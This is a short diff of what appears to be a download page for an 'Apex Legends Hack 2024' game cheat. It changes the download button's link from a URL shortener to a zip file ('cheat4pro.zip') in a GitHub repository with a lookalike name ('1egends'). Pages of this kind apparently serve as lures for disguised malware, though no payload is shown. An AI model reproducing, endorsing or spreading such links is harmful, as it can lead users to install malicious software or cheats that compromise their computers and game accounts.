@@ -7,7 +7,7 @@
 </div>
 
 <div align="center">
-    <h2><a href="https://goo.su/eHJFzDq">🔹 Download Apex Legends Hack 2024 🔹</a></h2>
+    <h2><a href="https://github.com/Apex-Legends-Hack-ESP/hack-apex-1egends/releases/download/312312/cheat4pro.zip">🔹 Download Apex Legends Hack 2024 🔹</a></h2>
 </div>
 
 ---
